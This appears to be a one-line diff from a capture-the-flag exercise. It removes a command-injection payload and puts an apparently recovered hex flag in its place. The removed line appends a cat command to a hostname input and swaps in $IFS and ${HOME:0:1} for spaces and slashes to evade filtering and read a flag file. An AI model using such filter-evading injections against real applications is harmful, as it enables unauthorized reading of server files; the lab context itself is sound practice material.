@@ -1,1 +1,1 @@
-google.com;cat$IFS${HOME:0:1}var${HOME:0:1}2-flag.txt
+8d62cee8dadfed12c42359b86e00b2a2
